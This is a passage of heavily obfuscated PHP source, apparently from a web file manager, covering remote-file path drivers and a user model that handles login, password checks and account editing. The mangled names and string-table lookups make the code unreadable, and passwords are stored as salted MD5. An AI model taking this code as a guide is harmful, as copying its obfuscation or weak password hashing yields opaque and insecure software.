$ó‡¸Ë»®); if ($ê“ÏÑŠ¦ === !1) { return !1; } fwrite($ö î®—Ñ, $ê“ÏÑŠ¦); $œ–½Î±ú += $ó‡¸Ë»®; if (strlen($ê“ÏÑŠ¦) < $ó‡¸Ë»®) { break; } } fclose($ö î®—Ñ); return $Üƒ è—; } public function link($·ÉÄÈ¶, $çûÏğ“© = array()) { $‹ª…›œÕ =& $_SERVER[÷ôÚîå]; $·ÉÄÈ¶ = trim($·ÉÄÈ¶, $‹ª…›œÕ[8]); if (!empty($this->token)) { $«ç‰éË« = strtotime(date($‹ª…›œÕ[1603])); $äÒöğ ¶ = substr(md5($this->token . $‹ª…›œÕ[369] . $«ç‰éË« . $‹ª…›œÕ[1604] . $·ÉÄÈ¶), 12, 8) . $«ç‰éË«; $çûÏğ“©[] = $‹ª…›œÕ[1605] . $äÒöğ ¶; } $Ùô÷èÛé = !empty($çûÏğ“©) ? $‹ª…›œÕ[86] . implode($‹ª…›œÕ[369], $çûÏğ“©) : $‹ª…›œÕ[12]; return $this->getHost() . $‹ª…›œÕ[8] . $·ÉÄÈ¶ . $Ùô÷èÛé; } public function fileOut($ÀÀø», $éÊ´³µ = false, $½Ğ‡•ªÁ = false, $‰¤“ÎÉ§ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÀÀø», $éÊ´³µ, $½Ğ‡•ªÁ, $‰¤“ÎÉ§); } if (!$½Ğ‡•ªÁ) { $½Ğ‡•ªÁ = $this->pathThis($ÀÀø»); } $á©ßç»Î = $éÊ´³µ ? array($_SERVER[÷ôÚîå][1606] . rawurlencode($½Ğ‡•ªÁ)) : array(); $÷‚ü·ı© = $this->link($ÀÀø», $á©ßç»Î); $this->fileOutLink($÷‚ü·ı©); } public function fileOutServer($ÌÔ¶µ‰, $¤¬Á‡ìÎ = false, $ŠĞõÔ¨Š = false, $£ßÉÂ§ = '') { parent::fileOut($ÌÔ¶µ‰, $¤¬Á‡ìÎ, $ŠĞõÔ¨Š, $£ßÉÂ§); } public function fileOutImage($ƒ¼˜˜ì±, $÷†…¼ÃÁ = 250) { $šŞî‡› = $this->link($ƒ¼˜˜ì± . $_SERVER[÷ôÚîå][1607] . $÷†…¼ÃÁ); $this->fileOutLink($šŞî‡›); } public function fileOutImageServer($Å™œŠ‚É, $®ê¸ôï = 250) { parent::fileOutImage($Å™œŠ‚É, $®ê¸ôï); } public function hashMd5($¦Š‡ã’·) { $¾ùİ§Ç =& $_SERVER[÷ôÚîå]; $µ¨†Óö® = $this->_objectMeta($¦Š‡ã’·); return isset($µ¨†Óö®[$¾ùİ§Ç[255]]) ? $µ¨†Óö®[$¾ùİ§Ç[255]] : !1; } public function size($Ÿ×ßÉÊí) { $öŒóÜ¨ = $this->objectMeta($Ÿ×ßÉÊí); return $öŒóÜ¨ ? $öŒóÜ¨[$_SERVER[÷ôÚîå][89]] : 0; } public function info($‰°¥ğ¹Ñ) { if ($this->isFolder($‰°¥ğ¹Ñ)) { return $this->folderInfo($‰°¥ğ¹Ñ); } else { if ($this->isFile($‰°¥ğ¹Ñ)) { return $this->fileInfo($‰°¥ğ¹Ñ); } } return !1; } public function exist($ü£çÈœÚ) { return $this->isFile($ü£çÈœÚ) || $this->isFolder($ü£çÈœÚ); } public function isFile($–û©äÀ×) { return !$this->isFolder($–û©äÀ×) && $this->objectMeta($–û©äÀ×); } public function isFolder($…İÊºùõ) { return $this->cacheMethod($_SERVER[÷ôÚîå][189], $…İÊºùõ); } protected function objectMeta($˜üŠ¿œ) { return $this->cacheMethod($_SERVER[÷ôÚîå][191], $˜üŠ¿œ); } protected function _objectMeta($Ñ’ìÑÑÚ) { $âï†··× =& $_SERVER[÷ôÚîå]; if ($Ñ’ìÑÑÚ == $âï†··×[12] || $Ñ’ìÑÑÚ == $âï†··×[8]) { return array(); } $Ùï¥Ùıù = $this->ussRequest($Ñ’ìÑÑÚ, $âï†··×[1608]); if (!$Ùï¥Ùıù[$âï†··×[1308]]) { return null; } $›“’œ¬ô = isset($Ùï¥Ùıù[$âï†··×[1298]]) ? $Ùï¥Ùıù[$âï†··×[1298]] : array(); if (!isset($›“’œ¬ô[$âï†··×[1609]])) { return null; } $üÉà©Ù’ = array($âï†··×[33] => isset($›“’œ¬ô[$âï†··×[1609]]) ? $›“’œ¬ô[$âï†··×[1609]] : null, $âï†··×[89] => isset($›“’œ¬ô[$âï†··×[1610]]) ? $›“’œ¬ô[$âï†··×[1610]] : null, $âï†··×[255] => isset($›“’œ¬ô[$âï†··×[1611]]) ? $›“’œ¬ô[$âï†··×[1611]] : null, $âï†··×[1578] => isset($›“’œ¬ô[$âï†··×[1612]]) ? $›“’œ¬ô[$âï†··×[1612]] : null); $üÉà©Ù’[$âï†··×[1579]] = isset($›“’œ¬ô[$âï†··×[1613]]) ? strtotime($›“’œ¬ô[$âï†··×[1613]]) : $üÉà©Ù’[$âï†··×[1578]]; return $üÉà©Ù’; } protected function _isFolder($Ô¯™ûÊƒ) { $×Ÿ€©ìç =& $_SERVER[÷ôÚîå]; if ($Ô¯™ûÊƒ == $×Ÿ€©ìç[12] || $Ô¯™ûÊƒ == $×Ÿ€©ìç[8]) { return !0; } $°ñÔîÀ¢ = $this->_objectMeta($Ô¯™ûÊƒ); return isset($°ñÔîÀ¢[$×Ÿ€©ìç[33]]) && $°ñÔîÀ¢[$×Ÿ€©ìç[33]] == $×Ÿ€©ìç[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($µŒÑ±´¨ = false) { } public function exist($¥¯¯°“) { $ªÇ»Çˆ = $this->info($¥¯¯°“); return $ªÇ»Çˆ[$_SERVER[÷ôÚîå][242]]; } public function isFile($³èä¤•) { $üõ¹Ôè¤ = $this->info($³èä¤•); return $üõ¹Ôè¤[$_SERVER[÷ôÚîå][242]]; } public function isFolder($öĞî´ñ¯) { return !1; } public function size($³Çö®©) { $ ò¼ÀÂœ = $this->info($³Çö®©); return $ ò¼ÀÂœ[$_SERVER[÷ôÚîå][89]]; } public function info($‘†ÚÏÒê) { return $this->infoParse($‘†ÚÏÒê); } public function infoAuth($¨ÙèïÈ) { return $this->infoParse($¨ÙèïÈ); } public function infoWithChildren($ÇÍ°Ùøë) { return $this->infoParse($ÇÍ°Ùøë); } public function infoFull($¸œÎÏ³) { return $this->infoParse($¸œÎÏ³); } private function infoParse($úÚÑ¿ß) { $ÎÊ”¶õ™ =& $_SERVER[÷ôÚîå]; $Ï“ ¶ÚØ = $this->header($úÚÑ¿ß); if (!$Ï“ ¶ÚØ || !$Ï“ ¶ÚØ[$ÎÊ”¶õ™[839]]) { return !1; } $È†õ»û¦ = _get($Ï“ ¶ÚØ, $ÎÊ”¶õ™[422], 0); $—À¿©Éî = array($ÎÊ”¶õ™[32] => $Ï“ ¶ÚØ[$ÎÊ”¶õ™[32]], $ÎÊ”¶õ™[97] => $úÚÑ¿ß, $ÎÊ”¶õ™[33] => $ÎÊ”¶õ™[240], $ÎÊ”¶õ™[89] => intval($È†õ»û¦), $ÎÊ”¶õ™[179] => get_path_ext($Ï“ ¶ÚØ[$ÎÊ”¶õ™[32]]), $ÎÊ”¶õ™[1464] => $È†õ»û¦ > 0 && $Ï“ ¶ÚØ[$ÎÊ”¶õ™[1614]], $ÎÊ”¶õ™[1465] => !1); return $—À¿©Éî; } private function header($çª¬øÃ¶) { $Ò†ò…şî =& $_SERVER[÷ôÚîå]; if (isset(self::$_cacheHeader[$çª¬øÃ¶])) { return self::$_cacheHeader[$çª¬øÃ¶]; } $¼ä¡€ô = isset($GLOBALS[$Ò†ò…şî[1615]]) ? $GLOBALS[$Ò†ò…şî[1615]] : !1; $GLOBALS[$Ò†ò…şî[1615]] = !0; self::$_cacheHeader[$çª¬øÃ¶] = url_header($çª¬øÃ¶); $GLOBALS[$Ò†ò…şî[1615]] = $¼ä¡€ô; return self::$_cacheHeader[$çª¬øÃ¶]; } public function hashSimple($‹¦‹€íå, $¯¤±öç‹ = false) { $‚ÙÊ½×‚ =& $_SERVER[÷ôÚîå]; $ØÁ™­û = $this->info($‹¦‹€íå); if (!$ØÁ™­û || !$ØÁ™­û[$‚ÙÊ½×‚[242]]) { return !1; } $©¸Ç«íú = $ØÁ™­û[$‚ÙÊ½×‚[89]]; $üÜöÔ·Á = 200; $½¹áÎ = 50; if ($©¸Ç«íú <= $üÜöÔ·Á * $½¹áÎ) { return md5($this->fileSubstr($‹¦‹€íå, 0, $©¸Ç«íú)) . $©¸Ç«íú; } $Ã·ßóáŠ = intval($©¸Ç«íú / $½¹áÎ); $ª½°«„® = $‚ÙÊ½×‚[12]; $¬ªîîÄï = timeFloat(); $¼âıÜ÷í = 15; for ($í‰‡Á¢ = 0; $í‰‡Á¢ < $½¹áÎ; $í‰‡Á¢++) { if (timeFloat() - $¬ªîîÄï > $¼âıÜ÷í) { return !1; } $«Šâœ±Å = $this->fileSubstr($‹¦‹€íå, $Ã·ßóáŠ * $í‰‡Á¢, $üÜöÔ·Á); if (!$«Šâœ±Å) { return !1; } $ª½°«„® .= $«Šâœ±Å; } $ª½°«„® .= $this->fileSubstr($‹¦‹€íå, $©¸Ç«íú - $üÜöÔ·Á, $üÜöÔ·Á); return md5($ª½°«„®) . $©¸Ç«íú; } public function getContent($•ŒÓìĞ) { return $this->fileSubstr($•ŒÓìĞ); } public function fileSubstr($×ù˜Ö€ø, $ÃË¢µúï = 0, $ƒóôõÌÏ = -1) { $€†ˆĞÅÃ =& $_SERVER[÷ôÚîå]; $¹»„‡Ôü = $this->info($×ù˜Ö€ø); if (!$¹»„‡Ôü || !$¹»„‡Ôü[$€†ˆĞÅÃ[242]] && $¹»„‡Ôü[$€†ˆĞÅÃ[89]] > 1024 * 1024 * 10) { return !1; } if ($ƒóôõÌÏ === -1) { $ƒóôõÌÏ = $¹»„‡Ôü[$€†ˆĞÅÃ[89]]; } if ($ƒóôõÌÏ == 0) { return $€†ˆĞÅÃ[12]; } $Ô¶Õô¡ = array($€†ˆĞÅÃ[1616] . $ÃË¢µúï . $€†ˆĞÅÃ[874] . ($ÃË¢µúï + $ƒóôõÌÏ - 1)); $ÔÏŸ‰ÂÙ = url_request($×ù˜Ö€ø, $€†ˆĞÅÃ[271], !1, $Ô¶Õô¡, !1, !1, 30); return $ÔÏŸ‰ÂÙ[$€†ˆĞÅÃ[1298]] ? $ÔÏŸ‰ÂÙ[$€†ˆĞÅÃ[1298]] : $€†ˆĞÅÃ[12]; } public function download($ÈÄìÔş, $Ÿ£ú½Õ°) { Downloader::start($ÈÄìÔş, $Ÿ£ú½Õ°); return $Ÿ£ú½Õ°; } } goto e‹¹âÀôÇË; dóùÕò¥â: define($_SERVER[÷ôÚîå][325], 2); define($_SERVER[÷ôÚîå][326], 3); define($_SERVER[÷ôÚîå][327], 1); goto eêí’ƒİÙË; B¤‘ÍÃíĞç: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\155\x65" => "\x75\x73\x65\162\137\155\145\164\141", "\155\145\x74\141\x46\151\145\154\x64" => "\165\x73\x65\162\111\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\x69\143\153\x4e\141\155\x65\54\x6e\141\155\x65\54\x61\x76\141\x74\141\162\54\x73\145\x78\x2c\x73\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ƒ€ÃÙ¨) { $ºÊüÚƒ¶ =& $_SERVER[÷ôÚîå]; $ÁË¯¦Ûï = $ºÊüÚƒ¶[2457]; return array($ºÊüÚƒ¶[2060] => array($ƒ€ÃÙ¨[0], $ÁË¯¦Ûï), $ºÊüÚƒ¶[2062] => array($ƒ€ÃÙ¨[0], $ÁË¯¦Ûï), $ºÊüÚƒ¶[2458] => array($ƒ€ÃÙ¨[0], $ÁË¯¦Ûï)); } protected function getInfo($…Ï‹êÖÅ, $ßÄöşÕ£ = false) { $ıÓ™Ú‘  = $this->getInfoSimple($…Ï‹êÖÅ); if (!is_array($ıÓ™Ú‘ )) { return array(); } if ($ßÄöşÕ£) { return $this->_getInfoApply($ıÓ™Ú‘ ); } return $this->cacheFunctionGet($_SERVER[÷ôÚîå][2064], $…Ï‹êÖÅ); } protected function getInfoFull($¨ŸÊ·şÇ, $×ÙÒäº… = false) { $æÂÚª± = $this->getInfoSimple($¨ŸÊ·şÇ); if (!is_array($æÂÚª±)) { return array(); } if ($×ÙÒäº…) { return $this->_getInfoApply($æÂÚª±, !0); } return $this->cacheFunctionGet($_SERVER[÷ôÚîå][2459], $¨ŸÊ·şÇ); } private function _getInfoApply($‡•…‡‰, $ ¢®Ñ‘ = false) { $±õï•õŠ =& $_SERVER[÷ôÚîå]; if (!$‡•…‡‰) { return $‡•…‡‰; } $’¥§åÚ = md5($±õï•õŠ[2460] . $‡•…‡‰[$±õï•õŠ[978]] . $±õï•õŠ[2461] . $‡•…‡‰[$±õï•õŠ[32]]); $‡•…‡‰ = $this->_listDataApplyItem($‡•…‡‰); $Ş¡×²µ = Model($±õï•õŠ[1429])->metaGet($‡•…‡‰[$±õï•õŠ[100]][$±õï•õŠ[203]]); $‡•…‡‰[$±õï•õŠ[2462]] = $’¥§åÚ; $‡•…‡‰[$±õï•õŠ[100]][$±õï•õŠ[2258]] = isset($Ş¡×²µ[$±õï•õŠ[2259]]) ? $Ş¡×²µ[$±õï•õŠ[2259]] : null; if ($ ¢®Ñ‘) { $‡•…‡‰[$±õï•õŠ[548]] = $this->metaGet($‡•…‡‰[$±õï•õŠ[1779]]); } return $‡•…‡‰; } protected function getInfoSimple($®‘úñºŠ, $ıÖö­—ğ = false) { $»Ôí‹ÊÌ =& $_SERVER[÷ôÚîå]; if (!$®‘úñºŠ) { return array(); } if ($ıÖö­—ğ) { $»”Ëøœ = $this->where(array($»Ôí‹ÊÌ[1779] => intval($®‘úñºŠ)))->find(); if (!is_array($»”Ëøœ)) { return array(); } $»”Ëøœ[$»Ôí‹ÊÌ[2463]] = Action($»Ôí‹ÊÌ[2464])->parseUrl($»”Ëøœ[$»Ôí‹ÊÌ[2463]]); return $»”Ëøœ; } return $this->cacheFunctionGet($»Ôí‹ÊÌ[2065], $®‘úñºŠ); } protected function getInfoSimpleOuter($·ÔçÜ) { $×…Ãòù¯ =& $_SERVER[÷ôÚîå]; if (!$·ÔçÜ || $·ÔçÜ == 0) { return array($×…Ãòù¯[1779] => $×…Ãòù¯[238], $×…Ãòù¯[32] => $×…Ãòù¯[186] . LNG($×…Ãòù¯[2465]) . $×…Ãòù¯[188], $×…Ãòù¯[2463] => STATIC_PATH . $×…Ãòù¯[2466]); } $ïäÜµóÅ = $this->cacheFunctionGet($×…Ãòù¯[2065], $·ÔçÜ); $Âà“Â‹ = array_field_key($ïäÜµóÅ, explode($×…Ãòù¯[50], $this->simpleField)); if (!$Âà“Â‹) { return array($×…Ãòù¯[1779] => $×…Ãòù¯[1284], $×…Ãòù¯[32] => $×…Ãòù¯[186] . LNG($×…Ãòù¯[2467]) . $×…Ãòù¯[188], $×…Ãòù¯[2463] => STATIC_PATH . $×…Ãòù¯[2468]); } $Âà“Â‹[$×…Ãòù¯[2463]] = Action($×…Ãòù¯[2464])->parseUrl($Âà“Â‹[$×…Ãòù¯[2463]]); return $Âà“Â‹; } protected function groupUser($Å¸½õí) { } public static function errorLang($¢‰…Ã) { $‚¼öùâÃ =& $_SERVER[÷ôÚîå]; $º¨å×ì¶ = array(self::ERROR_USER_NOT_EXISTS => $‚¼öùâÃ[2469], self::ERROR_USER_PASSWORD_ERROR => $‚¼öùâÃ[2470], self::ERROR_USER_EXIST_NAME => $‚¼öùâÃ[2471], self::ERROR_USER_EXIST_PHONE => $‚¼öùâÃ[2472], self::ERROR_USER_EXIST_EMAIL => $‚¼öùâÃ[2473], self::ERROR_USER_LOGIN_LOCK => $‚¼öùâÃ[2474], self::ERROR_IP_NOT_ALLOW => $‚¼öùâÃ[2475], self::ERROR_USER_EXIST_NICKNAME => $‚¼öùâÃ[2476]); $·Àı‹¼î = LNG($º¨å×ì¶[$¢‰…Ã]); if ($¢‰…Ã == self::ERROR_USER_LOGIN_LOCK) { $ê•¹“¥Î = (int) Model($‚¼öùâÃ[2477])->get($‚¼öùâÃ[2478]); if ($ê•¹“¥Î > 60) { $·Àı‹¼î = str_replace($‚¼öùâÃ[101], ceil($ê•¹“¥Î / 60), $·Àı‹¼î); } } return $·Àı‹¼î; } public function getInfoByMeta($…ÂıÇ¦º, $äÃªÒ°¼) { $†ìøàÍ– =& $_SERVER[÷ôÚîå]; $Ñ’ÍˆĞã = Model($†ìøàÍ–[2479])->where(array($†ìøàÍ–[107] => $…ÂıÇ¦º, $†ìøàÍ–[459] => $äÃªÒ°¼))->find(); if ($Ñ’ÍˆĞã) { return $this->getInfo($Ñ’ÍˆĞã[$†ìøàÍ–[1779]]); } return !1; } public function userLoginCheck($˜è’€‡—, $Ë´”’æü) { $­†‰ñïÅ =& $_SERVER[÷ôÚîå]; $×éú¦íî = $this->userLoginFind($˜è’€‡—); if (!$×éú¦íî) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($×éú¦íî[$­†‰ñïÅ[1779]], $Ë´”’æü)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($×éú¦íî[$­†‰ñïÅ[1779]]); } public function userLoginFind($áˆÊ‘åé) { $Øşˆè±ì =& $_SERVER[÷ôÚîå]; $€çÜ¾•… = array($Øşˆè±ì[32] => $áˆÊ‘åé, $Øşˆè±ì[2266] => $áˆÊ‘åé, $Øşˆè±ì[390] => $áˆÊ‘åé, $Øşˆè±ì[2480] => $áˆÊ‘åé, $Øşˆè±ì[1089] => $Øşˆè±ì[1091]); if ($this->nickNameRpt()) { unset($€çÜ¾•…[$Øşˆè±ì[2266]]); } return $this->where($€çÜ¾•…)->find(); } public function clearCache($ñç»»Œ) { $Õ¤ƒ— =& $_SERVER[÷ôÚîå]; $this->cacheFunctionClear($Õ¤ƒ—[2064], $ñç»»Œ); $this->cacheFunctionClear($Õ¤ƒ—[2065], $ñç»»Œ); $this->cacheFunctionClear($Õ¤ƒ—[2459], $ñç»»Œ); } public function userPasswordCheck($îêú¹šı, $¤Òç ãˆ) { $œåÚ©éˆ =& $_SERVER[÷ôÚîå]; $º†øß™€ = $this->where(array($œåÚ©éˆ[1779] => intval($îêú¹šı)))->find(); $¦«°Éå‡ = $this->metaGet($îêú¹šı); $ñÖá“”Š = isset($¦«°Éå‡[$œåÚ©éˆ[2481]]) ? $¦«°Éå‡[$œåÚ©éˆ[2481]] : $œåÚ©éˆ[12]; if (md5($ñÖá“”Š . trim($¤Òç ãˆ)) !== $º†øß™€[$œåÚ©éˆ[978]]) { return !1; } return !0; } public function userAdd($ñª¡Ö) { $¯Ê˜Ã‘‚ =& $_SERVER[÷ôÚîå]; $Îò±÷ç = array($¯Ê˜Ã‘‚[503] => $ñª¡Ö[$¯Ê˜Ã‘‚[32]], $¯Ê˜Ã‘‚[2482] => $ñª¡Ö[$¯Ê˜Ã‘‚[2184]], $¯Ê˜Ã‘‚[2483] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[390]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[390]] : $¯Ê˜Ã‘‚[12], $¯Ê˜Ã‘‚[2484] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[2480]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[2480]] : $¯Ê˜Ã‘‚[12], $¯Ê˜Ã‘‚[2485] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[2266]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[2266]] : $ñª¡Ö[$¯Ê˜Ã‘‚[32]], $¯Ê˜Ã‘‚[2486] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[2463]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[2463]] : $¯Ê˜Ã‘‚[12], $¯Ê˜Ã‘‚[2487] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[2488]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[2488]] : 1, $¯Ê˜Ã‘‚[2489] => $ñª¡Ö[$¯Ê˜Ã‘‚[978]], $¯Ê˜Ã‘‚[2066] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[1964]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[1964]] : 1024 * 1024 * 20, $¯Ê˜Ã‘‚[2067] => 0, $¯Ê˜Ã‘‚[2490] => 0, $¯Ê˜Ã‘‚[2111] => isset($ñª¡Ö[$¯Ê˜Ã‘‚[839]]) ? $ñª¡Ö[$¯Ê˜Ã‘‚[839]] : 1); if (!empty($ñª¡Ö[$¯Ê˜Ã‘‚[1779]])) { $Îò±÷ç[$¯Ê˜Ã‘‚[1779]] = $ñª¡Ö[$¯Ê˜Ã‘‚[1779]]; } $Ğ“«ÊâÒ = $this->_checkExist($ñª¡Ö); if ($Ğ“«ÊâÒ !== !0) { return $Ğ“«ÊâÒ; } if (!empty($Îò±÷ç[$¯Ê˜Ã‘‚[2463]]) && strlen($Îò±÷ç[$¯Ê˜Ã‘‚[2463]]) > 255) { $Îò±÷ç[$¯Ê˜Ã‘‚[2463]] = $¯Ê˜Ã‘‚[12]; } $ßÇé¡ıá = $this->add($Îò±÷ç); $òÌÚÂÍ = array($¯Ê˜Ã‘‚[2489] => $Îò±÷ç[$¯Ê˜Ã‘‚[978]], $¯Ê˜Ã‘‚[2485] => $Îò±÷ç[$¯Ê˜Ã‘‚[2266]]); $this->userEdit($ßÇé¡ıá, $òÌÚÂÍ); Model($¯Ê˜Ã‘‚[1429])->userRootAdd($ßÇé¡ıá); return $ßÇé¡ıá; } protected function userEditTest($ Ÿ®­“Ä, $Ê²õ·õÖ) { return $this->call($_SERVER[÷ôÚîå][2491], $ Ÿ®­“Ä, $Ê²õ·õÖ); } protected function userEdit($¼¨¢¶È, $ñ¶Ù³Ö„) { $¨Èï…ÄÓ =& $_SERVER[÷ôÚîå]; $›ÁÌ¥Ó = $this->getInfoSimple($¼¨¢¶È); if (!$›ÁÌ¥Ó) { return !1; } $ÁŞ‹øÎ´ = $this->_checkExist($ñ¶Ù³Ö„, $¼¨¢¶È); if ($ÁŞ‹øÎ´ !== !0) { return $ÁŞ‹øÎ´; } if (isset($ñ¶Ù³Ö„[$¨Èï…ÄÓ[978]]) && trim($ñ¶Ù³Ö„[$¨Èï…ÄÓ[978]]) != $¨Èï…ÄÓ[12]) { $ƒÕÃ”«Û = $this->metaGet($¼¨¢¶È); if (empty($ƒÕÃ”«Û[$¨Èï…ÄÓ[2481]])) { $ƒÕÃ”«Û[$¨Èï…ÄÓ[2481]] = rand_string(10); Model($¨Èï…ÄÓ[586])->metaSet($¼¨¢¶È, $¨Èï…ÄÓ[2481], $ƒÕÃ”«Û[$¨Èï…ÄÓ[2481]]); } $ñ¶Ù³Ö„[$¨Èï…ÄÓ[978]] = md5($ƒÕÃ”«Û[$¨Èï…ÄÓ[2481]] . trim($ñ¶Ù³Ö„[$¨Èï…ÄÓ[978]])); } else { unset($ñ¶Ù³Ö„[$¨Èï…ÄÓ[978]]); } if (!empty($ñ¶Ù³Ö„[$¨Èï…ÄÓ[2463]]) && strlen($ñ¶Ù³Ö„[$¨Èï…ÄÓ[2463]]) > 255) { $ñ¶Ù³Ö„[$¨Èï…ÄÓ[2463]] = $¨Èï…ÄÓ[12]; } $this->where(array($¨Èï…ÄÓ[1770] => $¼¨¢¶È))->save($ñ¶Ù³Ö„); if (isset($ñ¶Ù³Ö„[$¨Èï…ÄÓ[2266]])) { $this->setNamePinyin($¼¨¢¶È, $ñ¶Ù³Ö„[$¨Èï…ÄÓ[2266]]); } $this->clearCache($¼¨¢¶È); return !0; } public function setNamePinyin($Œ¨â…¨, $ñ–‹‚ö = false) { $ÃÓÂ‡Øñ =& $_SERVER[÷ôÚîå]; if (!$ñ–‹‚ö) { $ÃëÄÑ‰Ğ = $this->getInfoSimple($Œ¨â…¨); $ñ–‹‚ö = $ÃëÄÑ‰Ğ[$ÃÓÂ‡Øñ[2266]] ? $ÃëÄÑ‰Ğ[$ÃÓÂ‡Øñ[2266]] : $ÃëÄÑ‰Ğ[$ÃÓÂ‡Øñ[32]]; } $¦æ¼Şäú = Model($ÃÓÂ‡Øñ[607]); if (!Input::check($ñ–‹‚ö, $ÃÓÂ‡Øñ[664])) { return $¦æ¼Şäú->metaSet($Œ¨â…¨, array($ÃÓÂ‡Øñ[547] => $ÃÓÂ‡Øñ[12], $ÃÓÂ‡Øñ[546] => $ÃÓÂ‡Øñ[12])); } return $¦æ¼Şäú->metaSet($Œ¨â…¨, array($ÃÓÂ‡Øñ[547] => str_replace($ÃÓÂ‡Øñ[53], $ÃÓÂ‡Øñ[12], Pinyin::get($ñ–‹‚ö)), $ÃÓÂ‡Øñ[546] => Pinyin::get($ñ–‹‚ö, $ÃÓÂ‡Øñ[665]))); } private function nickNameRpt() { $¦òäŞßÓ =& $_SERVER[÷ôÚîå]; $×„î¦ËÈ = Model($¦òäŞßÓ[859])->get($¦òäŞßÓ[2492]); $¼“¶Ï§ª = $GLOBALS[$¦òäŞßÓ[6]][$¦òäŞßÓ[466]][$¦òäŞßÓ[2492]]; $­àô÷øŞ = !is_null($×„î¦ËÈ) ? $×„î¦ËÈ : $¼“¶Ï§ª; return !!$­àô÷øŞ; } private function _checkExist($Ñ¼–šÈ, $ƒé÷ß•ì = false) { $ó´•Œ…„ =& $_SERVER[÷ôÚîå]; $Ş†ù¼íƒ = array($ó´•Œ…„[32] => UserModel::ERROR_USER_EXIST_NAME, $ó´•Œ…„[2266] => UserModel::ERROR_USER_EXIST_NICKNAME, $ó´•Œ…„[390] => UserModel::ERROR_USER_EXIST_EMAIL, $ó´•Œ…„[2480] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ş†ù¼íƒ[$ó´•Œ…„[2266]]); } $¦¨­œ¸³ = $ƒé÷ß•ì ? array($ó´•Œ…„[1779] => array($ó´•Œ…„[2493], $ƒé÷ß•ì)) : array(); foreach ($Ş†ù¼íƒ as $÷Ú‘¿»¥ => $ıÀÒïÔÙ) { $»§ÃËî¡ = array(); foreach ($Ş†ù¼íƒ as $Ë÷¼ÅÕĞ => $¿Ğ•åîª) { if (isset($Ñ¼–šÈ[$Ë÷¼ÅÕĞ]) && $Ñ¼–šÈ[$Ë÷¼ÅÕĞ]) { $»§ÃËî¡[] = $Ñ¼–šÈ[$Ë÷¼ÅÕĞ]; } } if (!$»§ÃËî¡) { continue; } $Óô…¸Çµ = array_merge(array($÷Ú‘¿»¥ => array($ó´•Œ…„[7], $»§ÃËî¡)), $¦¨­œ¸³); $»ºŠ½€¢ = $this->where($Óô…¸Çµ)->find(); if ($»ºŠ½€¢) { return $ıÀÒïÔÙ; } } return !0; } public function userListInfo($ÀÆ³—Í‚) { $‡€ë¬±ô =& $_SERVER[÷ôÚîå]; $¢¯Áí˜ = array(); $ÀÆ³—Í‚ = is_array($ÀÆ³—Í‚) ? array_unique($ÀÆ³—Í‚) : array(); if (!$ÀÆ³—Í‚) { return $¢¯Áí˜; } if (count($ÀÆ³—Í‚) < 20) { foreach ($ÀÆ³—Í‚ as $ò×İıÜ£) { $¢¯Áí˜[$ò×İıÜ£ . $‡€ë¬±ô[12]] = $this->getInfoSimpleOuter($ò×İıÜ£); } } else { $ã£¡÷¸ = array($‡€ë¬±ô[1770] => array($‡€ë¬±ô[501], $ÀÆ³—Í‚)); if (count($ÀÆ³—Í‚) == 1) { $ã£¡÷¸ = array($‡€ë¬±ô[1770] => $ÀÆ³—Í‚[0]); } $Ø¢£íÆ = Model($‡€ë¬±ô[586])->field($this->simpleField)->where($ã£¡÷¸)->select(); $Ø¢£íÆ = array_to_keyvalue($Ø¢£íÆ, $‡€ë¬±ô[1779]); foreach ($ÀÆ³—Í‚ as $ò×İıÜ£) { $ª®âƒ“ß = $Ø¢£íÆ[$ò×İıÜ£]; if (!$ª®âƒ“ß) { $¢¯Áí˜[$ò×İıÜ£ . $‡€ë¬±ô[12]] = $this->getInfoSimpleOuter($ò×İıÜ£); continue; } $ª®âƒ“ß[$‡€ë¬±ô[2463]] = Action($‡€ë¬±ô[2464])->parseUrl($ª®âƒ“ß[$‡€ë¬±ô[2463]]); $¢¯Áí˜[$ò×İıÜ£ . $‡€ë¬±ô[12]] = $ª®âƒ“ß; } } return $¢¯Áí˜; } protected function userStatus($§‰ÄÒº, $¹ÁÎçıÌ) { $ÜªâãÒç = $this->getInfoSimple($§‰ÄÒº); if (!$ÜªâãÒç) { return !1; } $ß¬¿˜‡ª = array($_SERVER[÷ôÚîå][839] => $¹ÁÎçıÌ); return $this->userEdit($§‰ÄÒº, $ß¬¿˜‡ª); } protected function userRemove($¨ğ½´÷ä) { $®®Œœ× =& $_SERVER[÷ôÚîå]; $ÓÙÛ¾ı¶ = $this->getInfoSimple($¨ğ½´÷ä); if (!$ÓÙÛ¾ı¶) { return !1; } $¯¦´¯ÚÙ = array($®®Œœ×[1770] => $¨ğ½´÷ä); Model($®®Œœ×[673])->where($¯¦´¯ÚÙ)->delete(); Model($®®Œœ×[2494])->where($¯¦´¯ÚÙ)->delete(); Model($®®Œœ×[2072])->where($¯¦´¯ÚÙ)->delete(); Model($®®Œœ×[2479])->where($¯¦´¯ÚÙ)->delete(); 